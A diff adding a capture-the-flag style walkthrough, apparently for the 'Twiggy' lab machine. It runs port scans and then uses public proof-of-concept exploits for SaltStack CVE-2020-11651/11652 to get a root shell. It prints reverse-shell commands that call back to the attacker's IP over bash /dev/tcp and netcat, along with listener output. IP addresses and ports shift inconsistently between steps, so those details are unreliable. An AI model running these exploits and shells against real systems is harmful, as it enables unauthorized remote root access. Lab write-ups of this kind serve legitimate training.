@@ -1,0 +1,91 @@
+																							              Twiggy Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.62
+export IP=192.168.68.62
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,53,80,4505,4506,8000 $IP --open --stats-every=5s -oN results.txt
+ 
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+53/tcp   open  domain  NLnet Labs NSD
+80/tcp   open  http    nginx 1.16.1
+4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
+4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
+8000/tcp open  http    nginx 1.16.1
+|_http-title: Site doesn't have a title (application/json).
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+/blog/: Blog
+/contact/: Potentially interesting folder
+/search/: Potentially interesting folder
+
+nikto --url $IP 
+/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+
+PORT 53 
+ <!-- nothing -->
+ 
+PORT 80
+Mezzanine CMS 4.2.0 - Cross-Site Scripting
+http://192.168.68.62/admin/login/?next=/admin/               -- Admin login page
+
+Port 8000
+curl -v http://$IP:8000/          // Server header: X-Upstream: salt-api/3000-1
+searchsploit salt
+
+Saltstack 3000.1 - Remote Code Execution                                                                                                             | multiple/remote/48421.txt
+
+https://www.exploit-db.com/exploits/48421
+
+sudo pip3 install salt 
+git clone https://github.com/jasperla/CVE-2020-11651-poc.git
+cd CVE-2020-11651-poc
+python3 exploit.py --master 192.168.56.62 --exec "bash -i >& /dev/tcp/192.168.49.56/4505 0>&1"                   // You need to use the ports of one of the ZeroMQ ZMTP 2.0
+nc -lvnp 4505
+listening on [any] 4506 ...
+connect to [192.168.49.56] from (UNKNOWN) [192.168.56.62] 60596
+bash: no job control in this shell
+cd /root
+cat proof.txt                       // d687657aae65ec8dbd35c1d17077c656
+
+
+If you encounter problem installing salt because salt doesn't support Python 3.8 and Kali won't let us install packages under Python 3.7. Let's tweak the exploit to address this issue.
+
+apt --fix-broken install
+apt install python3.11-venv
+python3 -m venv env                        // no message
+. ./env/bin/activate                           // no message
+pip install distro salt
+sed -i 's/from platform import _supported_dists//' ./env/lib/python3.8/site-packages/salt/grains/core.py
+sed -i 's/_supported_dists +=/_supported_dists =/' ./env/lib/python3.8/site-packages/salt/grains/core.py
+
+
+root@kalimah:~/salt# python3 exploit.py --master 192.168.153.62 --exec "nc 192.168.45.181 4505 -e /bin/sh"
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Salt version: 3000.1
+[ ] This version of salt is vulnerable! Check results below
+[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651...
+[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
+[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130
+[+] Successfully scheduled job: 20200504153851746472
+root@kalimah:~/salt#
+
+
+https://github.com/Al1ex/CVE-2020-11652
+
+python3 exploit.py --master 192.168.153.62 --port 4506 -lh 192.168.45.181 -lp 4505 --exec-choose master
+
+rlwrap nc -lvnp 4505
+listening on [any] 4505 ...
+connect to [192.168.45.181] from (UNKNOWN) [192.168.153.62] 54116
+bash: no job control in this shell
+[root@twiggy root]# whoami
+root
